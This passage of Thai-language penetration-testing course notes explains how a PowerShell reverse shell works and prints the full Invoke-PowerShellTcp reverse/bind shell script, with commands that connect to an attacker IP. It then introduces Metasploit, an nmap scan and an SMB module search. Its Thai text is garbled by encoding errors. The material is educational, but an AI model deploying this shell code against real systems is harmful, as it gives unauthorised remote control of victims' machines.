‚îÇ     6. ‡πÄ‡∏û‡∏¥‡πà‡∏° prompt                          ‚îÇ       ‚îÇ
‚îÇ        + 'PS ' + (pwd).Path + '> '          ‚îÇ       ‚îÇ
‚îÇ                ‚ñº                             ‚îÇ       ‚îÇ
‚îÇ     7. ‡πÅ‡∏õ‡∏•‡∏á string ‚Üí bytes                  ‚îÇ       ‚îÇ
‚îÇ        GetBytes()                            ‚îÇ       ‚îÇ
‚îÇ                ‚ñº                             ‚îÇ       ‚îÇ
‚îÇ     8. ‡∏™‡πà‡∏á‡∏Å‡∏•‡∏±‡∏ö‡πÑ‡∏õ‡∏´‡∏≤ Attacker                 ‚îÇ       ‚îÇ
‚îÇ        $stream.Write()                       ‚îÇ       ‚îÇ
‚îÇ        $stream.Flush()                       ‚îÇ       ‚îÇ
‚îÇ                ‚îÇ                             ‚îÇ       ‚îÇ
‚îÇ                ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îÇ
‚îÇ                                                       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                       ‚ñ≤         ‚îÇ
                       ‚îÇ         ‚îÇ
        Commands       ‚îÇ         ‚îÇ  Results
                       ‚îÇ         ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ            Attacker Machine (nc listener)             ‚îÇ
‚îÇ                                                       ‚îÇ
‚îÇ  nc -lvnp 443                                         ‚îÇ
‚îÇ  PS C:\Users\victim> whoami                          ‚îÇ
‚îÇ  victim\user                                          ‚îÇ
‚îÇ  PS C:\Users\victim>                                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```



## Timeline ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏´‡∏ô‡∏∂‡πà‡∏á

**Attacker ‡∏û‡∏¥‡∏°‡∏û‡πå: `Get-Process`**

```
Time  | Action
------|---------------------------------------------------------
T=0   | Attacker: ‡∏û‡∏¥‡∏°‡∏û‡πå "Get-Process\n"
      | nc ‡∏™‡πà‡∏á ‚Üí network
      |
T=1   | Victim: $stream.Read() ‡∏£‡∏±‡∏ö bytes
      | $data = "Get-Process\n"
      |
T=2   | Victim: iex "Get-Process\n"
      | PowerShell execute ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á
      | $sendback = [list of processes]
      |
T=3   | Victim: ‡∏™‡∏£‡πâ‡∏≤‡∏á $sendback2
      | = [list] + "PS C:\Users\victim> "
      |
T=4   | Victim: ‡πÅ‡∏õ‡∏•‡∏á ‚Üí bytes
      | $stream.Write() ‚Üí $stream.Flush()
      | ‡∏™‡πà‡∏á ‚Üí network
      |
T=5   | Attacker: nc ‡πÅ‡∏™‡∏î‡∏á‡∏ú‡∏•
      | Handles  NPM(K)    PM(K)      WS(K) ...
      | PS C:\Users\victim>
```


---

**Reverse Shell ‡∏ô‡∏µ‡πâ:**
1. ‚úÖ ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏à‡∏≤‡∏Å Victim ‚Üí Attacker (‡∏´‡∏•‡∏ö inbound firewall)
2. ‚úÖ ‡πÉ‡∏ä‡πâ port 443 (‡∏î‡∏π‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô HTTPS traffic)
3. ‚úÖ Interactive shell (‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÑ‡∏î‡πâ‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏¢‡πÜ)
4. ‚úÖ Error handling (2>&1)
5. ‚úÖ Prompt ‡πÅ‡∏™‡∏î‡∏á current directory

**‡∏à‡∏∏‡∏î‡∏≠‡πà‡∏≠‡∏ô:**
- ‡∏ï‡πâ‡∏≠‡∏á‡∏°‡∏µ PowerShell (‡∏°‡∏µ‡πÉ‡∏ô Windows ‡∏ó‡∏∏‡∏Å‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏±‡πâ‡∏á‡πÅ‡∏ï‡πà 7 ‡∏Ç‡∏∂‡πâ‡∏ô‡πÑ‡∏õ)
- ‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö‡πÑ‡∏î‡πâ‡∏à‡∏≤‡∏Å process/network monitoring
- Blocked ‡πÑ‡∏î‡πâ‡∏à‡∏≤‡∏Å Antivirus/EDR

‡∏°‡∏µ‡∏™‡πà‡∏ß‡∏ô‡πÑ‡∏´‡∏ô‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡πÑ‡∏´‡∏°‡∏Ñ‡∏£‡∏±‡∏ö? üòä

---

## PowerShell Script Format

One-liner ‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏°‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏±‡∏ô‡πÉ‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö **PowerShell script (`.ps1`)** ‡πÑ‡∏î‡πâ‡πÄ‡∏ä‡πà‡∏ô‡∏Å‡∏±‡∏ô

### ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á: Nishang Project

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

‡∏î‡∏π‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á source code ‡∏à‡∏≤‡∏Å **nishang project** - script ‡∏ä‡∏∑‡πà‡∏≠ `Invoke-PowerShellTcp`:

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏Ç‡∏≠‡∏á script ‡∏ô‡∏µ‡πâ:**
- **Reverse Shell:** ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏¢‡∏±‡∏á Netcat listener ‡∏ö‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ
- **Bind Shell:** ‡∏£‡∏≠‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏à‡∏≤‡∏Å Netcat ‡∏ö‡∏ô port ‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏´‡∏ô‡∏î
- ‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö‡∏ó‡∏±‡πâ‡∏á **IPv4 ‡πÅ‡∏•‡∏∞ IPv6**

**‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô:**

1. **Reverse Shell:**
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```

2. **Bind Shell:**
```powershell
Invoke-PowerShellTcp -Bind -Port 4444
```

3. **Reverse Shell ‡∏ú‡πà‡∏≤‡∏ô IPv6:**
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

**Script:**

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

```

---

## Payloads ‡∏°‡∏µ‡∏´‡∏•‡∏≤‡∏¢‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö

### ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à:

**1. ‡∏ó‡∏≥‡πÑ‡∏°‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à Payload?**
- ‡∏ä‡πà‡∏ß‡∏¢‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏ß‡πà‡∏≤**‡∏ó‡∏≥‡πÑ‡∏° AV ‡∏ñ‡∏∂‡∏á‡∏ö‡∏•‡πá‡∏≠‡∏Å‡πÄ‡∏£‡∏≤**
- ‡πÉ‡∏´‡πâ‡πÅ‡∏ô‡∏ß‡∏Ñ‡∏¥‡∏î‡∏ß‡πà‡∏≤**‡∏ï‡πâ‡∏≠‡∏á‡πÅ‡∏Å‡πâ‡πÇ‡∏Ñ‡πâ‡∏î‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÑ‡∏£‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏ö‡∏´‡∏•‡∏µ‡∏Å‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö**
- ‡∏à‡∏∞‡πÑ‡∏î‡πâ‡πÄ‡∏£‡∏µ‡∏¢‡∏ô‡∏£‡∏π‡πâ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡πÉ‡∏ô‡πÇ‡∏°‡∏î‡∏π‡∏•‡∏ô‡∏µ‡πâ

**2. ‡∏õ‡∏±‡∏à‡∏à‡∏±‡∏¢‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏´‡∏ô‡∏î Payload ‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ:**
- **OS** ‡∏Ç‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
- **Shell interpreter languages** ‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà
- **Programming languages** ‡∏ó‡∏µ‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ

**3. ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏Ç‡∏≠‡∏á Payload:**

**Manual Payloads:**
- One-liners ‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á copy & paste
- Deploy ‡∏î‡πâ‡∏ß‡∏¢‡∏°‡∏∑‡∏≠
- ‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡∏ó‡∏µ‡πà‡πÄ‡∏£‡∏≤‡∏®‡∏∂‡∏Å‡∏©‡∏≤‡∏°‡∏≤‡πÉ‡∏ô‡∏™‡πà‡∏ß‡∏ô‡∏ô‡∏µ‡πâ

**Automated Payloads:**
- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏î‡∏¢ automated attack frameworks
- Deploy ‡πÄ‡∏õ‡πá‡∏ô pre-packaged/automated attack
- **‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:** Metasploit-framework (‡∏à‡∏∞‡πÄ‡∏£‡∏µ‡∏¢‡∏ô‡∏£‡∏π‡πâ‡πÉ‡∏ô‡∏´‡∏±‡∏ß‡∏Ç‡πâ‡∏≠‡∏ñ‡∏±‡∏î‡πÑ‡∏õ)

---
# Automating Payloads & Delivery with Metasploit

## Metasploit ‡∏Ñ‡∏∑‡∏≠‡∏≠‡∏∞‡πÑ‡∏£?

**Metasploit** ‡∏Ñ‡∏∑‡∏≠ **automated attack framework** ‡∏ó‡∏µ‡πà‡∏û‡∏±‡∏í‡∏ô‡∏≤‡πÇ‡∏î‡∏¢ Rapid7 ‡∏ã‡∏∂‡πà‡∏á‡∏ä‡πà‡∏ß‡∏¢‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏Å‡∏£‡∏∞‡∏ö‡∏ß‡∏ô‡∏Å‡∏≤‡∏£ exploit ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏á‡πà‡∏≤‡∏¢‡∏Ç‡∏∂‡πâ‡∏ô‡∏ú‡πà‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ **pre-built modules** ‡∏ó‡∏µ‡πà‡∏°‡∏µ:
- ‡∏ï‡∏±‡∏ß‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏á‡πà‡∏≤‡∏¢
- ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ exploit ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà
- ‡∏™‡πà‡∏á payload ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡πÑ‡∏î‡πâ shell ‡∏ö‡∏ô‡∏£‡∏∞‡∏ö‡∏ö‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà

### ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏£‡∏£‡∏∞‡∏ß‡∏±‡∏á:

**‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏Ñ‡∏ß‡∏≤‡∏°‡∏á‡πà‡∏≤‡∏¢‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô:**
- Metasploit ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡∏Å‡∏≤‡∏£ exploit ‡∏á‡πà‡∏≤‡∏¢‡∏°‡∏≤‡∏Å
- ‡∏ö‡∏≤‡∏á‡∏≠‡∏á‡∏Ñ‡πå‡∏Å‡∏£‡∏ù‡∏∂‡∏Å‡∏≠‡∏ö‡∏£‡∏°‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡∏≠‡∏ö
- Hack The Box ‡∏™‡∏ô‡∏±‡∏ö‡∏™‡∏ô‡∏∏‡∏ô‡πÉ‡∏´‡πâ‡∏ó‡∏î‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡∏à‡∏ô‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ñ‡πà‡∏≠‡∏á‡πÅ‡∏ó‡πâ

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏±‡∏ö‡∏ú‡∏¥‡∏î‡∏ä‡∏≠‡∏ö‡∏Ç‡∏≠‡∏á‡πÄ‡∏£‡∏≤:**
- ‡∏≠‡∏á‡∏Ñ‡πå‡∏Å‡∏£‡∏™‡πà‡∏ß‡∏ô‡πÉ‡∏´‡∏ç‡πà‡πÑ‡∏°‡πà‡∏à‡∏≥‡∏Å‡∏±‡∏î‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ
- ‡πÅ‡∏ï‡πà‡∏Ñ‡∏≤‡∏î‡∏´‡∏ß‡∏±‡∏á‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤**‡∏£‡∏π‡πâ‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ó‡∏≥‡∏≠‡∏∞‡πÑ‡∏£**
- **‡∏ï‡πâ‡∏≠‡∏á‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö‡∏Ç‡∏≠‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ**
- ‡∏Å‡∏≤‡∏£‡πÑ‡∏°‡πà‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡∏≠‡∏≤‡∏à‡∏ó‡∏≥‡∏•‡∏≤‡∏¢‡∏£‡∏∞‡∏ö‡∏ö‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ pentest ‡∏´‡∏£‡∏∑‡∏≠ audit ‡∏à‡∏£‡∏¥‡∏á

### ‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô‡∏Ç‡∏≠‡∏á Metasploit:

**1. Community Edition:**
- ‡πÉ‡∏ä‡πâ‡∏ü‡∏£‡∏µ
- ‡∏à‡∏∞‡πÉ‡∏ä‡πâ‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô‡∏ô‡∏µ‡πâ‡πÉ‡∏ô‡πÇ‡∏°‡∏î‡∏π‡∏•

**2. Metasploit Pro:**
- ‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô‡πÅ‡∏ö‡∏ö‡πÄ‡∏™‡∏µ‡∏¢‡πÄ‡∏á‡∏¥‡∏ô
- ‡∏ö‡∏£‡∏¥‡∏©‡∏±‡∏ó‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢‡πÉ‡∏ä‡πâ‡∏ó‡∏≥ penetration tests, security audits, social engineering campaigns
- [‡∏î‡∏π‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡πÄ‡∏õ‡∏£‡∏µ‡∏¢‡∏ö‡πÄ‡∏ó‡∏µ‡∏¢‡∏ö‡πÑ‡∏î‡πâ‡∏ó‡∏µ‡πà‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå]

---

## ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô Metasploit

### ‡∏Å‡∏≤‡∏£‡πÄ‡∏õ‡∏¥‡∏î Metasploit Framework Console

```bash
sudo msfconsole
```

**Output ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ:**
```
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt

       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

msf6 > 
```

### ‡∏ï‡∏±‡∏ß‡πÄ‡∏•‡∏Ç‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç:

| ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó | ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô | ‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢ |
|--------|-------|----------|
| **Exploits** | 2131 | ‡πÇ‡∏°‡∏î‡∏π‡∏•‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö exploit ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà |
| **Payloads** | 592 | Payload ‡∏ó‡∏µ‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ |
| **Auxiliary** | 1139 | ‡πÇ‡∏°‡∏î‡∏π‡∏•‡∏ä‡πà‡∏ß‡∏¢‡πÄ‡∏´‡∏•‡∏∑‡∏≠ (scan, enumerate) |
| **Post** | 363 | ‡πÇ‡∏°‡∏î‡∏π‡∏•‡∏´‡∏•‡∏±‡∏á exploitation |
| **Encoders** | 45 | ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö encode payload |
| **Nops** | 10 | No-operation instructions |
| **Evasion** | 8 | ‡πÇ‡∏°‡∏î‡∏π‡∏•‡∏´‡∏•‡∏ö‡∏´‡∏•‡∏µ‡∏Å‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö |

**‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏:** ‡∏ï‡∏±‡∏ß‡πÄ‡∏•‡∏Ç‡πÄ‡∏´‡∏•‡πà‡∏≤‡∏ô‡∏µ‡πâ‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÑ‡∏õ‡∏ï‡∏≤‡∏°‡∏Å‡∏≤‡∏£‡∏≠‡∏±‡∏õ‡πÄ‡∏î‡∏ï

---

## ‡∏Å‡∏£‡∏∞‡∏ö‡∏ß‡∏ô‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô Metasploit

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 1: Enumeration ‡∏î‡πâ‡∏ß‡∏¢ Nmap

‡∏Å‡πà‡∏≠‡∏ô‡πÉ‡∏ä‡πâ Metasploit ‡∏ï‡πâ‡∏≠‡∏á scan ‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏Å‡πà‡∏≠‡∏ô:

```bash
nmap -sC -sV -Pn 10.129.164.25
```

**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:**
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

**‡∏Å‡∏≤‡∏£‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå:**
- ‡πÄ‡∏´‡πá‡∏ô port ‡∏°‡∏≤‡∏ï‡∏£‡∏ê‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á Windows
- **Port 445:** SMB service - ‡πÄ‡∏õ‡πá‡∏ô attack vector ‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à
- ‡∏Å‡∏≤‡∏£ scan ‡∏ä‡πà‡∏ß‡∏¢‡πÉ‡∏´‡πâ‡∏£‡∏π‡πâ‡∏ß‡πà‡∏≤ OS ‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏∑‡∏≠‡∏≠‡∏∞‡πÑ‡∏£

### ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ó‡∏µ‡πà 2: ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Module ‡πÉ‡∏ô Metasploit

```bash
msf6 > search smb
```

**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:**
```
#    Name                                    Disclosure Date    Rank       Description
41   auxiliary/scanner/smb/smb_ms17_010                        normal     MS17-010 SMB RCE Detection
56   exploit/windows/smb/psexec             1999-01-01         manual     Microsoft Windows Authenticated User Code Execution
60   exploit/windows/smb/ms10_046...        2010-07-16         excellent  Microsoft Windows Shell LNK Code Execution
```

---

## ‡∏ó‡∏≥‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏à‡πÇ‡∏Ñ‡∏£‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á Module

### ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á: Module ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏•‡∏Ç 56

```
56   exploit/windows/smb/psexec
```

